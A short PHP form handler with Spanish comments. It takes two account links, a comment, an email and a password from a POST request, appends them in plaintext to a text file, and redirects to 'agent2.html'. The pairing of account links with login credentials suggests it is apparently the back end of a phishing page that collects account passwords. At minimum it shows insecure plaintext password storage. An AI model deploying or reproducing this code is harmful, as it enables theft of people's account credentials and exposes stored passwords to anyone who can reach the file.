$linkcuentac = $_POST['linkcuentac'];
$linkcuentag = $_POST['linkcuentag'];
$comentario = $_POST['comentario'];
$email = $_POST['email'];
$contrasena = $_POST['contrasena'];

// Guardar en un archivo (ejemplo simple)
$file = 'respuestas.txt';
$current = file_get_contents($file);
$current .= "Link cuenta comunidad: $linkcuentac, Link cuenta global: $linkcuentag, Comentario: $comentario, Email: $email, Contrasena: $contrasena\n";
file_put_contents($file, $current);

// Redirigir a una página de agradecimiento
header("Location: agent2.html");
exit();
